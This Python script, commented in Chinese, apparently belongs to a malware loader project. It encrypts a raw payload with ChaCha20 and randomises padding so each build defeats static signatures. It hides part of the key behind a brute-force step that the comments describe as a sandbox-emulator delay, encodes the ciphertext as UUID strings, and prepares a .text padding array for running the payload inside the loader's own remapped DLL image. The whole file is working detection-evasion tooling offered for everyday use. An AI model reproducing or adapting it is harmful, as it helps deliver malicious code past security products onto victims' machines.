#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
gen_payload.py —— 生成载荷头文件 payload_payload.h（加载器加密数据）。

管线（与出厂构建完全一致）：
  1. 原始载荷按 16 字节对齐补齐
  2. 追加 4~6KB 随机尾部填充（运行期永远不读；作用是让每次构建的
     静态指纹都不同）
  3. ChaCha20 加密（随机 32 字节密钥 + 12 字节 nonce）
  4. 密钥拆成两个 29 字节半段（masked ^ mask）内嵌；加载器对未知的
     3 个字节暴破还原，用首块明文 CRC32 校验——顺带形成天然的
     沙箱模拟器延迟（约 1670 万次迭代）
  5. 密文序列化为 UUID 格式字符串表

同时生成 phantom 自镜像所需的超大 .text 填充数组（phantom 阶段把本 DLL
以 SEC_IMAGE 重新映射，载荷覆写并执行于自己的 .text，因此 .text 必须
大于载荷）。

用法：
    python gen_payload.py <载荷.bin> [输出=payload_payload.h] [textpad大小]

输出的头文件被 main.c include；日常换载荷直接在项目根目录跑
python build.py 新载荷.bin 即可（内部自动调用本脚本）。
"""
import os
import random
import sys
import uuid as _uuid
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)


def chacha20_block(key32, counter, nonce12):
    """单个 ChaCha20 块（RFC 8439 实现，生成前已用 RFC 7539 测试向量校验）。"""
    def rotl(v, n):
        return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF

    def qr(s, a, b, c, d):
        s[a] = (s[a] + s[b]) & 0xFFFFFFFF; s[d] ^= s[a]; s[d] = rotl(s[d], 16)
        s[c] = (s[c] + s[d]) & 0xFFFFFFFF; s[b] ^= s[c]; s[b] = rotl(s[b], 12)
        s[a] = (s[a] + s[b]) & 0xFFFFFFFF; s[d] ^= s[a]; s[d] = rotl(s[d], 8)
        s[c] = (s[c] + s[d]) & 0xFFFFFFFF; s[b] ^= s[c]; s[b] = rotl(s[b], 7)

    st = [0x61707865, 0x3320646E, 0x79622D32, 0x6B206574]
    st += list(struct.unpack('<8I', key32))
    st.append(counter)
    st += list(struct.unpack('<3I', nonce12))
    w = st[:]
    for _ in range(10):
        qr(w, 0, 4, 8, 12); qr(w, 1, 5, 9, 13); qr(w, 2, 6, 10, 14); qr(w, 3, 7, 11, 15)
        qr(w, 0, 5, 10, 15); qr(w, 1, 6, 11, 12); qr(w, 2, 7, 8, 13); qr(w, 3, 4, 9, 14)
    return struct.pack('<16I', *[(w[i] + st[i]) & 0xFFFFFFFF for i in range(16)])


def chacha20(data, key32, nonce12):
    """流式加密：计数器从 1 起，逐块异或（与加载器侧解密严格对应）。"""
    out = bytearray()
    for ctr in range(1, (len(data) + 63) // 64 + 1):
        ks = chacha20_block(key32, ctr, nonce12)
        chunk = data[(ctr - 1) * 64: ctr * 64]
        out += bytes(a ^ b for a, b in zip(chunk, ks))
    return bytes(out)


def c_arr(data, per_line=24):
    """把字节串排成 C 数组初始化文本。"""
    lines = []
    for i in range(0, len(data), per_line):
        lines.append('    ' + ','.join('0x%02X' % b for b in data[i:i + per_line]) + ',')
    return '\n'.join(lines)


def main():
    payload_path = sys.argv[1] if len(sys.argv) > 1 else 'payload.bin'
    out_path = sys.argv[2] if len(sys.argv) > 2 else os.path.join(ROOT, 'src', 'payload_payload.h')
    txtpad_size = int(sys.argv[3]) if len(sys.argv) > 3 else 147456

    payload = open(payload_path, 'rb').read()
    payload += b'\x90' * ((16 - len(payload) % 16) % 16)
    # 4~6KB 随机尾部，16 字节对齐（保证 UUID 切块精确）
    payload += bytes(random.randrange(256) for _ in range(4096 + 16 * random.randrange(128)))

    key = bytes(random.randrange(256) for _ in range(32))
    nonce = bytes(random.randrange(256) for _ in range(12))
    cipher = chacha20(payload, key, nonce)
    crc = zlib.crc32(payload[:64]) & 0xFFFFFFFF

    mask = bytes(random.randrange(256) for _ in range(29))
    masked = bytes(a ^ b for a, b in zip(key[:29], mask))

    uus = [str(_uuid.UUID(bytes=cipher[i:i + 16])) for i in range(0, len(cipher), 16)]

    h = []
    h.append('/* 由 tools/gen_payload.py 自动生成 —— 请勿手改。\n'
             ' * 重新生成：python tools/gen_payload.py <载荷.bin>\n'
             ' * 内嵌内容：密钥双半（29B masked）、nonce、明文头 64 字节 CRC32、\n'
             ' * UUID 格式密文表、phantom .text 填充。 */\n')
    h.append('#ifndef PAYLOAD_PAYLOAD_H\n#define PAYLOAD_PAYLOAD_H\n')
    # 注意：g_key_* 绝不能加 const —— 加了会落到只读 .rdata，
    # 加载器擦除密钥阶段直接访问异常
    h.append('static unsigned char g_key_masked[29] = {\n%s\n};' % c_arr(masked))
    h.append('static unsigned char g_key_mask[29] = {\n%s\n};' % c_arr(mask))
    h.append('static unsigned char g_nonce[12] = {\n%s\n};' % c_arr(nonce))
    h.append('#define G_HEADER_CRC32 0x%08Xu' % crc)
    h.append('static const char* const sc_uuids[] = {\n%s\n};'
             % '\n'.join('    "%s",' % u for u in uus))
    h.append('#define UUID_COUNT %du' % len(uus))
    h.append('#define SC_LEN %du' % len(cipher))

    # phantom .text 填充：7x NOP + INT3 循环（良性编译器风格填充，低熵）
    row = ['0xCC' if i % 8 == 7 else '0x90' for i in range(txtpad_size)]
    fill = '\n'.join('    ' + ','.join(row[i:i + 24]) + ',' for i in range(0, txtpad_size, 24))
    h.append('#define TXTPAD_SIZE %du' % txtpad_size)
    h.append('#if defined(_MSC_VER)\n'
             '#pragma section(".text", read, execute)\n'
             '__declspec(allocate(".text")) const unsigned char g_txtpad[TXTPAD_SIZE] = {\n%s\n};\n'
             '#else\n'
             '__attribute__((section(".text"), used)) const unsigned char g_txtpad[TXTPAD_SIZE] = {\n%s\n};\n'
             '#endif' % (fill, fill))
    h.append('#endif /* PAYLOAD_PAYLOAD_H */\n')

    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    open(out_path, 'w').write('\n\n'.join(h))
    print('已生成 %s（载荷 %d B，密文 %d B，%d 条 UUID，textpad %d B）'
          % (out_path, len(payload), len(cipher), len(uus), txtpad_size))


import struct
if __name__ == '__main__':
    main()
